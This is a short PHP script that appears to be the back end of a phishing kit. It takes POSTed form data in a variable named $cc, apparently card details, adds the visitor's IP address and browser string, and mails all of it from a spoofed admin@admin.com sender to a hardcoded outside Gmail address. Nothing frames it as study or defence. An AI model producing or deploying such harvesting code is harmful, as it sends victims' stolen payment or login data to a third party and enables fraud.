<?php 

$subject = $_POST['subject'];
$cc = $_POST['data']; 
$ip = getenv("REMOTE_ADDR");
$user = getenv("HTTP_USER_AGENT");


$from = "admin@admin.com";
$to = "lunaperlaa@gmail.com";


mail($to, $subject, $cc, $ip, $user , "MIME-Version: 1.0\r\nContent-type: text/html; charset=iso-8859-1\r\nFrom: $from\r\nReply-to: $from\r\n");


?>